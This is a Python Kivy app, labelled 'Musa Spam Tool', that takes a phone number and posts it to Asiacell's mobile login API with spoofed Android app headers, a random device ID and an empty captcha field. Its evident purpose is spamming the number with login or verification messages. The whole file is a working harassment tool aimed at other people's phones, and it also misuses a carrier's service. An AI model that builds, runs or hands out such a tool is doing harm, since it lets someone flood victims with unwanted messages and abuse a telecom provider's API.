from kivy.app import App
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.textinput import TextInput
from kivy.uix.button import Button
from kivy.uix.label import Label
from kivy.clock import Clock
import requests
import json
import uuid
import threading

class SpamApp(App):
    def build(self):
        self.title = "Musa Spam Tool"
        
        layout = BoxLayout(orientation='vertical', padding=30, spacing=20)
        
        layout.add_widget(Label(text="[b]Musa Asiacell Tool[/b]", markup=True, font_size=24, size_hint_y=None, height=50))
        
        self.number_input = TextInput(
            hint_text='Enter phone number (e.g. 078xxxxxxxx)', 
            multiline=False, 
            input_type='number',
            size_hint_y=None, 
            height=50
        )
        layout.add_widget(self.number_input)
        
        self.btn = Button(
            text='Start Spam', 
            background_color=(0.2, 0.6, 0.8, 1),
            size_hint_y=None, 
            height=60
        )
        self.btn.bind(on_press=self.start_thread)
        layout.add_widget(self.btn)
        
        self.status_label = Label(text='Status: Idle', font_size=18)
        layout.add_widget(self.status_label)
        
        return layout

    def start_thread(self, instance):
        number = self.number_input.text.strip()
        if not number:
            self.status_label.text = "Error: Enter a number!"
            return
        
        self.btn.disabled = True
        self.status_label.text = "Running..."
        
        threading.Thread(target=self.run_spam, args=(number,)).start()

    def run_spam(self, number):
        url = "https://odpapp.asiacell.com/api/v1/login?lang=en"
        payload = {"captchaCode": "", "username": number}
        headers = {
            'User-Agent': "okhttp/5.1.0",
            'Connection': "Keep-Alive",
            'Accept-Encoding': "gzip",
            'Content-Type': "application/json; charset=UTF-8",
            'Cache-Control': "no-cache",
            'DeviceID': str(uuid.uuid4()),
            'X-OS-Version': "14",
            'X-Device-Type': "[Android][TECNO][TECNO LH7n 14][TIRAMISU][HMS][4.3.7:90000325]",
            'X-ODP-APP-VERSION': "4.3.7",
            'X-FROM-APP': "odp",
            'X-ODP-CHANNEL': "mobile",
            'X-SCREEN-TYPE': "false"
        }
        
        try:
            response = requests.post(url, data=json.dumps(payload), headers=headers).text
            if '"success":true' in response:
                Clock.schedule_once(lambda dt: self.update_status(f"True spam ~ {number}", True))
            else:
                Clock.schedule_once(lambda dt: self.update_status(f"False spam ~ {number}", True))
        except Exception as e:
            Clock.schedule_once(lambda dt: self.update_status(f"Error: {str(e)}", True))

    def update_status(self, text, enable_btn):
        self.status_label.text = text
        if enable_btn:
            self.btn.disabled = False

if __name__ == '__main__':
    SpamApp().run()
